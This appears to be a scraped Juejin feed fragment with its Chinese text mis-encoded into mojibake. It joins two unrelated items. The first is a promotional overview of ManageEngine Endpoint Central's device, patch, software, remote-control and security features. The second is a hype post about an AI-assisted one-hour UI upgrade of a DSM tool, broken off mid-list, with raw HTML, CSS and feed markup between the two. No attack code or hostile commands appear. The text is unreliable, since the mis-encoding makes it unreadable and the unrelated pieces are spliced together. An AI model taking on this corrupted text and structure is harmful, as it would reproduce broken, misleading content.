<p>Endpoint Central æ˜¯ä¸€æ¬¾ç”±Â <strong>ManageEngine</strong>Â æä¾›çš„ç»ˆç«¯ç®¡ç†è§£å†³æ–¹æ¡ˆï¼Œå®ƒå¸®åŠ© IT ç®¡ç†å‘˜åœ¨ä¸€ä¸ªç»Ÿä¸€çš„å¹³å°ä¸Šé«˜æ•ˆç®¡ç†å’Œä¿æŠ¤ä¼ä¸šçš„ç»ˆç«¯è®¾å¤‡ã€‚æœ¬æ–‡å°†æ¢è®¨ Endpoint Central çš„æ ¸å¿ƒåŠŸèƒ½ã€ä¼˜åŠ¿ï¼Œä»¥åŠå¦‚ä½•å¸®åŠ©ä¼ä¸šæé«˜ç»ˆç«¯ç®¡ç†æ•ˆç‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65cfb13a33914a74ba27f7bdb267b691~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFuYWdlRW5naW5l5Y2T6LGq5a6Y5pa56LSm5Y-3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594238&amp;x-signature=M1wnEh%2BciJl7KdaDW%2FvL%2FsJWpIY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>ä»€ä¹ˆæ˜¯ Endpoint Centralï¼Ÿ</strong></h2>
<p>Endpoint Centralï¼ˆå‰èº«ä¸º Desktop Centralï¼‰æ˜¯ä¸€æ¬¾ä¼ä¸šçº§çš„ç»ˆç«¯ç®¡ç†å·¥å…·ï¼Œæ”¯æŒå¯¹å„ç§è®¾å¤‡ï¼ˆå¦‚æ¡Œé¢ç”µè„‘ã€ç¬”è®°æœ¬ã€ç§»åŠ¨è®¾å¤‡ç­‰ï¼‰çš„é›†ä¸­ç®¡ç†ã€‚é€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„æ§åˆ¶å°ï¼Œç®¡ç†å‘˜å¯ä»¥è½»æ¾å®Œæˆè®¾å¤‡é…ç½®ã€è¡¥ä¸ç®¡ç†ã€è½¯ä»¶åˆ†å‘ã€è¿œç¨‹æ§åˆ¶å’Œå®‰å…¨ç›‘æ§ç­‰ä»»åŠ¡ï¼Œæå¤§åœ°æå‡äº† IT ç®¡ç†çš„æ•ˆç‡ã€‚</p>
<h2 data-id="heading-1"><strong>Endpoint Central çš„æ ¸å¿ƒåŠŸèƒ½</strong></h2>
<p><strong>è®¾å¤‡ç®¡ç†</strong></p>
<ul>
<li>
<ul>
<li>
<p><strong>è®¾å¤‡å‘ç°ä¸åˆ†ç±»</strong>ï¼šEndpoint Central è‡ªåŠ¨æ‰«æä¼ä¸šç½‘ç»œï¼Œè¯†åˆ«å¹¶åˆ†ç±»æ‰€æœ‰è¿æ¥çš„è®¾å¤‡ï¼ŒåŒ…æ‹¬ Windowsã€Macã€Linux ç­‰æ“ä½œç³»ç»Ÿï¼Œç¡®ä¿ç®¡ç†å‘˜èƒ½å¤Ÿå®æ—¶äº†è§£ç½‘ç»œä¸­çš„æ‰€æœ‰ç»ˆç«¯ã€‚</p>
</li>
<li>
<p><strong>è®¾å¤‡é…ç½®ä¸ç­–ç•¥ç®¡ç†</strong>ï¼šç®¡ç†å‘˜å¯ä»¥é€šè¿‡é¢„è®¾çš„é…ç½®ç­–ç•¥ï¼Œæ‰¹é‡é…ç½®è®¾å¤‡ï¼Œç®€åŒ–äº†è®¾å¤‡çš„åˆå§‹åŒ–è®¾ç½®ä»¥åŠæ—¥å¸¸çš„ç»´æŠ¤å·¥ä½œã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>è¡¥ä¸ç®¡ç†</strong></p>
<ul>
<li>
<ul>
<li>Endpoint Central æä¾›è‡ªåŠ¨åŒ–è¡¥ä¸ç®¡ç†åŠŸèƒ½ï¼Œç¡®ä¿æ‰€æœ‰ç»ˆç«¯è®¾å¤‡å®‰è£…æœ€æ–°çš„æ“ä½œç³»ç»Ÿè¡¥ä¸å’Œåº”ç”¨ç¨‹åºæ›´æ–°ï¼Œå‡å°‘äº†å®‰å…¨æ¼æ´çš„é£é™©ã€‚å®ƒæ”¯æŒ Windowsã€Linux å’Œ Mac æ“ä½œç³»ç»Ÿçš„è¡¥ä¸ç®¡ç†ï¼Œå¸®åŠ©ä¼ä¸šä¿æŒåˆè§„æ€§ã€‚</li>
</ul>
</li>
</ul>
<p><strong>è½¯ä»¶ç®¡ç†</strong></p>
<ul>
<li>
<ul>
<li>
<p><strong>è½¯ä»¶åˆ†å‘</strong>ï¼šç®¡ç†å‘˜å¯ä»¥é€šè¿‡ Endpoint Central æ‰¹é‡éƒ¨ç½²è½¯ä»¶ï¼Œç®€åŒ–äº†è½¯ä»¶çš„å®‰è£…ã€å‡çº§å’Œå¸è½½è¿‡ç¨‹ï¼Œæé«˜äº†æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>è®¸å¯è¯ç®¡ç†</strong>ï¼šå®ƒè¿˜å¸®åŠ©ä¼ä¸šè·Ÿè¸ªè½¯ä»¶è®¸å¯è¯çš„ä½¿ç”¨æƒ…å†µï¼Œé¿å…è¿‡åº¦ä½¿ç”¨æˆ–è®¸å¯è¯è¿‡æœŸï¼Œä»è€Œé™ä½åˆè§„é£é™©ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>è¿œç¨‹æ§åˆ¶ä¸æ”¯æŒ</strong></p>
<ul>
<li>
<ul>
<li>
<p><strong>è¿œç¨‹æ§åˆ¶</strong>ï¼šç®¡ç†å‘˜å¯ä»¥é€šè¿‡ Endpoint Central è¿œç¨‹æ§åˆ¶ç»ˆç«¯è®¾å¤‡ï¼Œè¿›è¡Œæ•…éšœæ’é™¤ã€é…ç½®è°ƒæ•´ç­‰æ“ä½œï¼Œæ— éœ€åˆ°ç°åœºï¼Œæå¤§åœ°æé«˜äº†æ”¯æŒæ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>è¿œç¨‹è¯Šæ–­</strong>ï¼šå€ŸåŠ©å®æ—¶ç›‘æ§å’Œè¯Šæ–­åŠŸèƒ½ï¼Œç®¡ç†å‘˜å¯ä»¥æå‰è¯†åˆ«æ½œåœ¨é—®é¢˜å¹¶è¿›è¡Œå¤„ç†ï¼Œé¿å…è®¾å¤‡æ•…éšœå¯¹å·¥ä½œé€ æˆå½±å“ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>å®‰å…¨ç®¡ç†</strong></p>
<ul>
<li>
<ul>
<li>
<p><strong>è®¾å¤‡åŠ å¯†ä¸æ•°æ®ä¿æŠ¤</strong>ï¼šEndpoint Central æä¾›æ•°æ®åŠ å¯†å’Œä¸¢å¤±é˜²æŠ¤åŠŸèƒ½ï¼Œå¸®åŠ©ä¼ä¸šä¿éšœæ•æ„Ÿä¿¡æ¯å®‰å…¨ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²ã€‚</p>
</li>
<li>
<p><strong>USB ç«¯å£æ§åˆ¶</strong>ï¼šé€šè¿‡è®¾ç½® USB ç«¯å£ä½¿ç”¨ç­–ç•¥ï¼Œä¼ä¸šèƒ½å¤Ÿé˜²æ­¢æœªç»æˆæƒçš„å¤–éƒ¨è®¾å¤‡è¿æ¥ï¼Œä»è€Œå¢å¼ºç»ˆç«¯è®¾å¤‡çš„å®‰å…¨æ€§ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>ç§»åŠ¨è®¾å¤‡ç®¡ç†ï¼ˆMDMï¼‰</strong></p>
<ul>
<li>
<ul>
<li>é™¤äº†ä¼ ç»Ÿçš„æ¡Œé¢å’Œç¬”è®°æœ¬è®¾å¤‡ï¼ŒEndpoint Central è¿˜æ”¯æŒå¯¹ä¼ä¸šå†…çš„ç§»åŠ¨è®¾å¤‡è¿›è¡Œç®¡ç†ï¼ŒåŒ…æ‹¬è®¾å¤‡æ³¨å†Œã€é…ç½®ã€åº”ç”¨åˆ†å‘åŠè¿œç¨‹æ“¦é™¤ç­‰åŠŸèƒ½ï¼Œç¡®ä¿ç§»åŠ¨è®¾å¤‡çš„å®‰å…¨æ€§ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d5ad78410c449e2b46a3f6e52160702~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFuYWdlRW5naW5l5Y2T6LGq5a6Y5pa56LSm5Y-3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594238&amp;x-signature=ZG7dA4IH93YQ0KGeXujUQgFC3kg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>Endpoint Central çš„ä¼˜åŠ¿</strong></h2>
<ol>
<li>
<p><strong>ç®€åŒ–ç®¡ç†æµç¨‹</strong><br/>
Endpoint Central æä¾›ç»Ÿä¸€çš„ç®¡ç†å¹³å°ï¼ŒIT å›¢é˜Ÿæ— éœ€åˆ‡æ¢å¤šä¸ªå·¥å…·æˆ–ç³»ç»Ÿï¼Œå³å¯å®Œæˆç»ˆç«¯è®¾å¤‡çš„é…ç½®ã€ç›‘æ§ã€è¡¥ä¸ç®¡ç†ç­‰å·¥ä½œã€‚è¿™ç§é›†ä¸­å¼ç®¡ç†æ˜¾è‘—æé«˜äº†å·¥ä½œæ•ˆç‡ï¼Œå¹¶å‡å°‘äº†ç®¡ç†å¤æ‚åº¦ã€‚</p>
</li>
<li>
<p><strong>æå‡å®‰å…¨æ€§</strong><br/>
è‡ªåŠ¨åŒ–çš„è¡¥ä¸ç®¡ç†å’Œè®¾å¤‡ç›‘æ§åŠŸèƒ½å¸®åŠ©ä¼ä¸šä¿æŒè®¾å¤‡çš„å®‰å…¨çŠ¶æ€ï¼ŒåŠæ—¶å‘ç°å¹¶ä¿®å¤ç³»ç»Ÿæ¼æ´ï¼Œé˜²æ­¢æ¶æ„è½¯ä»¶å’Œç½‘ç»œæ”»å‡»ã€‚è®¾å¤‡åŠ å¯†ã€æ•°æ®ä¸¢å¤±é˜²æŠ¤å’Œ USB æ§åˆ¶ç­‰å®‰å…¨åŠŸèƒ½ï¼Œä¸ºä¼ä¸šæ•°æ®æä¾›å¤šå±‚æ¬¡ä¿æŠ¤ã€‚</p>
</li>
<li>
<p><strong>æé«˜å‘˜å·¥å·¥ä½œæ•ˆç‡</strong><br/>
é€šè¿‡è¿œç¨‹æ”¯æŒå’Œæ§åˆ¶ï¼Œç®¡ç†å‘˜èƒ½å¤Ÿè¿…é€Ÿè§£å†³ç»ˆç«¯è®¾å¤‡ä¸Šçš„é—®é¢˜ï¼Œé¿å…äº†é•¿æ—¶é—´çš„æ•…éšœç­‰å¾…å’Œäººå‘˜æµåŠ¨ï¼Œç¡®ä¿å‘˜å·¥çš„å·¥ä½œä¸å—å½±å“ï¼Œæå‡äº†æ•´ä½“æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>é™ä½è¿è¥æˆæœ¬</strong><br/>
è‡ªåŠ¨åŒ–ç®¡ç†å’Œæ‰¹é‡æ“ä½œæ˜¾è‘—å‡å°‘äº†äººå·¥å¹²é¢„çš„éœ€æ±‚ï¼ŒèŠ‚çœäº† IT æ”¯æŒçš„æ—¶é—´å’ŒäººåŠ›èµ„æºã€‚æ­¤å¤–ï¼Œè½¯ä»¶è®¸å¯è¯å’Œè®¾å¤‡ç”Ÿå‘½å‘¨æœŸçš„ç›‘æ§å¸®åŠ©ä¼ä¸šé¿å…ä¸å¿…è¦çš„æ”¯å‡ºã€‚</p>
</li>
<li>
<p><strong>ä¿éšœåˆè§„æ€§</strong><br/>
ä¼ä¸šé€šè¿‡ Endpoint Central å®ç°è®¾å¤‡ç®¡ç†çš„åˆè§„æ€§ï¼Œç¡®ä¿æ‰€æœ‰ç»ˆç«¯è®¾å¤‡ç¬¦åˆè¡Œä¸šæ³•è§„å’Œä¼ä¸šå†…éƒ¨æ”¿ç­–ï¼Œä»è€Œé™ä½å®¡è®¡å’Œåˆè§„é£é™©ã€‚</p>
</li>
</ol>
<h2 data-id="heading-3"><strong>å¦‚ä½•æœ‰æ•ˆåˆ©ç”¨ Endpoint Central æé«˜ç»ˆç«¯ç®¡ç†æ•ˆç‡ï¼Ÿ</strong></h2>
<ol>
<li>
<p><strong>åˆ¶å®šè®¾å¤‡ç®¡ç†è§„èŒƒ</strong><br/>
åœ¨éƒ¨ç½² Endpoint Central ä¹‹å‰ï¼Œä¼ä¸šéœ€è¦æ ¹æ®å®é™…éœ€æ±‚åˆ¶å®šè®¾å¤‡ç®¡ç†ç­–ç•¥ã€‚ä¾‹å¦‚ï¼Œå“ªäº›è®¾å¤‡éœ€è¦ç®¡ç†ã€å¦‚ä½•é…ç½®è®¾å¤‡ã€å¦‚ä½•éƒ¨ç½²è¡¥ä¸ç­‰ã€‚æ˜ç¡®çš„è§„èŒƒæœ‰åŠ©äºåœ¨åæœŸä½¿ç”¨è¿‡ç¨‹ä¸­ä¿æŒç®¡ç†çš„ä¸€è‡´æ€§å’Œé«˜æ•ˆæ€§ã€‚</p>
</li>
<li>
<p><strong>åˆ©ç”¨è‡ªåŠ¨åŒ–åŠŸèƒ½ä¼˜åŒ–æµç¨‹</strong><br/>
Endpoint Central çš„è‡ªåŠ¨åŒ–åŠŸèƒ½å¯ä»¥æå¤§åœ°å‡å°‘äººå·¥å¹²é¢„ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥è®¾ç½®å®šæœŸè¡¥ä¸è‡ªåŠ¨æ¨é€ã€æ‰¹é‡éƒ¨ç½²è½¯ä»¶ã€è‡ªåŠ¨æ£€æµ‹è®¾å¤‡çŠ¶æ€ç­‰ï¼Œå‡å°‘ç¹ççš„æ‰‹åŠ¨æ“ä½œï¼Œæå‡å·¥ä½œæ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>å®šæœŸå®¡è®¡ä¸å®‰å…¨æ£€æŸ¥</strong><br/>
é€šè¿‡ Endpoint Central æä¾›çš„ç›‘æ§å’ŒæŠ¥å‘ŠåŠŸèƒ½ï¼ŒIT ç®¡ç†å‘˜å¯ä»¥å®šæœŸæ£€æŸ¥è®¾å¤‡çš„å®‰å…¨æ€§å’Œåˆè§„æ€§ï¼Œç¡®ä¿æ‰€æœ‰ç»ˆç«¯è®¾å¤‡è¿è¡Œæ­£å¸¸ï¼Œä¸”ç¬¦åˆä¼ä¸šçš„å®‰å…¨è¦æ±‚ã€‚</p>
</li>
<li>
<p><strong>å…³æ³¨æ€§èƒ½ä¼˜åŒ–</strong><br/>
ä¼ä¸šå¯ä»¥åˆ©ç”¨ Endpoint Central æä¾›çš„å®æ—¶è¯Šæ–­å·¥å…·ï¼Œç›‘æ§è®¾å¤‡çš„æ€§èƒ½è¡¨ç°ï¼ŒåŠæ—¶å‘ç°å¹¶è§£å†³å¯èƒ½çš„ç¡¬ä»¶æ•…éšœæˆ–è½¯ä»¶é—®é¢˜ï¼Œç¡®ä¿è®¾å¤‡å§‹ç»ˆå¤„äºæœ€ä½³å·¥ä½œçŠ¶æ€ã€‚</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71ac54ee891342389f13066cf51f985f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFuYWdlRW5naW5l5Y2T6LGq5a6Y5pa56LSm5Y-3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594238&amp;x-signature=cyB0J7t125B1NcbXmpLfAifgjHc%3D" alt="" loading="lazy"/></p>
<p>åœ¨å½“ä»Šä¼ä¸šç¯å¢ƒä¸­ï¼Œç»ˆç«¯è®¾å¤‡çš„ç®¡ç†ä¸å®‰å…¨æ€§ç›´æ¥å½±å“åˆ°ä¸šåŠ¡çš„é¡ºåˆ©è¿›è¡Œã€‚é€šè¿‡Â <strong>Endpoint Central</strong>ï¼Œä¼ä¸šä¸ä»…å¯ä»¥ç®€åŒ–è®¾å¤‡çš„ç®¡ç†æµç¨‹ï¼Œæå‡ç»ˆç«¯çš„å®‰å…¨æ€§ï¼Œè¿˜èƒ½å¤§å¹…åº¦æé«˜å·¥ä½œæ•ˆç‡å¹¶é™ä½è¿è¥æˆæœ¬ã€‚å¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ç§é›†æˆåŒ–ã€è‡ªåŠ¨åŒ–çš„ç»ˆç«¯ç®¡ç†è§£å†³æ–¹æ¡ˆï¼ŒEndpoint Central æ— ç–‘æ˜¯ä¸€ä¸ªå€¼å¾—æ¨èçš„é€‰æ‹©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æƒŠäº†ï¼ooder-orgè—æç¤ºè¯å½©è›‹ï½œAIé©±åŠ¨å·¥ç¨‹å…¸èŒƒï¼Œ1å°æ—¶ç„•æ–°DSMå…¨é A2UI]]></title>    <link>https://juejin.cn/post/7588704463620669459</link>    <guid>https://juejin.cn/post/7588704463620669459</guid>    <pubDate>2025-12-29T06:34:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463620669459" data-draft-id="7588827110505447467" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æƒŠäº†ï¼ooder-orgè—æç¤ºè¯å½©è›‹ï½œAIé©±åŠ¨å·¥ç¨‹å…¸èŒƒï¼Œ1å°æ—¶ç„•æ–°DSMå…¨é A2UI"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,å…¨æ ˆ,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2025-12-29T06:34:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æƒŠäº†ï¼ooder-orgè—æç¤ºè¯å½©è›‹ï½œAIé©±åŠ¨å·¥ç¨‹å…¸èŒƒï¼Œ1å°æ—¶ç„•æ–°DSMå…¨é A2UI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:34:10.000Z" title="Mon Dec 29 2025 06:34:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æŠ€æœ¯äººç¦éŸ³ï¼âœ¨ 1å°æ—¶å®ç°æ—§å·¥å…·ç•Œé¢ç„•æ–°ï¼onecodeå›¢é˜Ÿç”¨AICoding+Ooder A2UIå‡çº§DSMç•Œé¢ï¼Œä¸ä»…æå®šæ¡†æ¶é€‚é…ï¼Œè¿˜æŒ–å‡ºä¸ªéšè—å½©è›‹ï¼Œæ•ˆç‡ç›´æ¥æ‹‰æ»¡ï¼è¿™æ³¢æ“ä½œå¤ªå€¼å¾—æŠ„ä½œä¸šäº†ï½</p>
<p>ä½ä»£ç å·¥å…·å‡çº§é‡ä¸ŠAIé©±åŠ¨çš„å…¨æ ˆå¼€å‘æ¡†æ¶ï¼Œæ•ˆç‡å’Œä½“éªŒç›´æ¥ç¿»å€ï¼onecodeå›¢é˜Ÿè¿™æ¬¡å¸¸è§„æŠ€æœ¯è¿­ä»£ï¼Œä¸å…‰è®©noecodeé¢†åŸŸçš„DSMï¼ˆè®¾è®¡ç»“æ„çŸ©é˜µï¼‰å·¥å…·ç•Œé¢ä»â€œèƒ½ç”¨â€å˜â€œå¥½ç”¨â€ï¼Œè¿˜æ„å¤–æ‰¾åˆ°äº†é«˜æ•ˆå‡çº§çš„å…³é”®â€”â€”è—åœ¨ooder-orgæ ·æ¿å·¥ç¨‹é‡Œçš„æç¤ºè¯­å½©è›‹ã€‚è¿™æ¬¡AICodingå’ŒOoder A2UIçš„é…åˆï¼Œå½»åº•åˆ·æ–°äº†ä¼ä¸šçº§å·¥å…·å‡çº§çš„æ•ˆç‡è®¤çŸ¥ï¼</p>
<h2 data-id="heading-0">âœ¨ å‡çº§èƒŒæ™¯ï¼šæ—§å·¥å…·æ€¥éœ€é€‚é…æ–°æ¡†æ¶</h2>
<p>DSMæ˜¯noecodeçš„æ ¸å¿ƒå·¥å…·ï¼Œä½†æ—§UIå’Œæœ€æ–°çš„Ooder A2UIæ¡†æ¶ä¸å…¼å®¹ï¼ç•Œé¢ä¹±ã€äº¤äº’å¡ï¼Œå®Œå…¨å‘æŒ¥ä¸å‡ºæ–°æ¡†æ¶çš„ä¼˜åŠ¿ğŸ˜­ å›¢é˜Ÿç›´æ¥æ”¾å¼ƒäº†ä¼ ç»Ÿäººå·¥é‡å†™çš„ç¬¨åŠæ³•ï¼Œé€‰äº†AICodingé©±åŠ¨å‡çº§ï¼Œä¸»æ‰“ä¸€ä¸ªé«˜æ•ˆï¼</p>
<h2 data-id="heading-1">ğŸ”¥ 3æ­¥æå®šï¼1å°æ—¶æé€Ÿç„•æ–°æµç¨‹</h2>
<ol>
<li>ğŸ“¥ ç¬¬ä¸€æ­¥ï¼šCloneæ ·æ¿é—´ ä¸¥æ ¼è·Ÿç€Ooder A2UIæ•™ç¨‹ï¼Œæ‹‰å–ooder-orgå¼€æºæ ·æ¿å·¥ç¨‹ï¼è¿™å¯æ˜¯å®˜æ–¹æœ€ä½³å®è·µæ¨¡æ¿ï¼Œè§†å›¾ã€æœåŠ¡ã€è·¯ç”±éƒ½æœ‰æ ‡å‡†èŒƒå¼ï¼Œç»™AIæ‰¾å¥½å‚è€ƒåŸºå‡†ï½</li>
<li>ğŸ“ ç¬¬äºŒæ­¥ï¼šä¸‹æŒ‡ä»¤ è·ŸAICodingè¯´æ¸…æ¥šéœ€æ±‚ï¼šä»¥æ ·æ¿é—´ä¸ºè“æœ¬ï¼Œåˆ†æDSMå’ŒOoder A2UIçš„å·®å¼‚ï¼Œè¾“å‡ºåŒ…å«â€œè§†å›¾é‡æ„+æœåŠ¡é€‚é…+èœå•æ‰“é€šâ€çš„å‡çº§æ–¹æ¡ˆ</li>
<li>â³ ç¬¬ä¸‰æ­¥ï¼šç­‰äº¤ä»˜ ä¸ç”¨ç®¡ï¼AIè‡ªåŠ¨åˆ†æ+ç¼–ç ï¼Œ1å°æ—¶å°±æå®šäº†æ‰€æœ‰å·¥ä½œï¼Œç›´æ¥äº¤å‡ºå¯è¿è¡Œçš„æˆæœï¼</li>
</ol>
<h2 data-id="heading-2">ğŸŒŸ æƒŠè‰³æ•ˆæœï¼ä¸æ­¢é€‚é…ï¼Œç›´æ¥ç„•æ–°</h2>
<p>æœ¬æ¥åªæƒ³è¦ä¸ªâ€œå…¼å®¹ç‰ˆâ€ï¼Œç»“æœAIç›´æ¥ç»™äº†â€œå‡çº§ç‰ˆâ€ï¼è¿è¡Œèµ·æ¥é‚£ä¸€åˆ»å…¨å›¢é˜Ÿéƒ½æƒŠäº†ï¼Œå’Œä¹‹å‰å®Œå…¨æ˜¯ä¸¤ä¸ªç³»ç»Ÿï¼</p>
<ul>
<li>âœ… ç³»ç»Ÿæ¢³ç†é‡å†™ è‡ªåŠ¨æŠŠDSMæ‹†æˆè§†å›¾å±‚ã€æœåŠ¡å±‚ã€èœå•ï¼Œå¯¹æ¯”æ—§æ¶æ„å’Œæ–°æ¡†æ¶çš„å·®å¼‚ï¼Œç²¾å‡†é‡å†™ä»£ç ï¼Œæ— ç¼è¡”æ¥ï¼</li>
